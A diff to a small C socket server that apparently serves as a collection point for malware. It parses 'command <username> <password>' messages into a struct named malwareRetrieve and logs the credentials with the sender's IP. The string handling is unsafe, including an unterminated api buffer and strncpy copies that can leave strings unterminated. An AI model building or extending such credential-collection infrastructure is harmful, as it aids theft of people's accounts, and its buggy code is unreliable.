@@ -16,12 +16,20 @@ char api[7] = "command";
 int socketfd;
 struct sockaddr_in addr;
 struct sockaddr_in client_addr;
+
+
 typedef struct infoclient {
   int client;
   char ip[INET_ADDRSTRLEN];
 } infoclient;
 
+typedef struct malwareRetrieve{
+  char username[64];
+  char password[64];
+  char ipaddr[INET_ADDRSTRLEN];
+} malwareRetrieve;
 
+  
 void *handleClient(void *arg){
   infoclient *client = (infoclient*)  arg;
   printf("id: %d - from: %s - Connexion established and is being handled !\n", client->client, client->ip);
@@ -34,31 +42,41 @@ void *handleClient(void *arg){
     }
     char buffer[512];
     if (recv(client->client, buffer, sizeof(buffer), 0) != -1) {
-      printf("id: %d - from: %s - Message received is '%s' \n",client->client, client->ip, buffer);
-      if (strncmp(buffer, api, 7) == 0 ) {
-        printf("id: %d - from: %s - Successfull connexion to the command api ! \n", client->client, client->ip);
+      buffer[strcspn(buffer, "\r\n")] = '\0';
+      printf("id: %d - from: %s - Message received is %s \n",client->client, client->ip, buffer);
+      char *clientinput = strtok(buffer, " ");
+      if (strncmp(clientinput, api, sizeof(api)) == 0 ) {
+        malwareRetrieve current;
+        clientinput = strtok(NULL, " ");
+        if (clientinput != NULL) {
+          strncpy(current.username, clientinput, 64);
+          clientinput = strtok(NULL, " ");
+          if (clientinput != NULL) {
+            strncpy(current.password, clientinput, 64);
+            printf("id: %d - from: %s - Successfull connexion to the command\n --> Username: %s, Password: %s ! \n", client->client, client->ip, current.username, current.password);
+            strncpy(current.ipaddr, client->ip, 16);
+            close(client->client);
+            free(client);
+            return NULL;
+          }
+          else {
+              printf("id: %d - from: %s - Wrong api calls!\n", client->client, client->ip);
+              break;
+          }
+        }
+        else {
+            printf("id: %d - from: %s - Wrong api calls !\n", client->client, client->ip);
+            break;
+        }
       }
       else {
         printf("id: %d - from: %s - Connexion to the server without api args, exit!!\n", client->client, client->ip);
         break;
       }
-
-      
+           
     }
 
   }
-
-
-  
-  // char msg[64] = "Successfull connexion, goodbye now!\n";
-  // if (write(client->, msg, sizeof(msg)) == sizeof(msg)){
-  //   printf("Success, message has been correctly send\n");
-  // }
-  // else {
-  //   printf("Error - Return does not match the size of the message\n");
-  // }
-
-
 
   close(client->client);
   free(client);
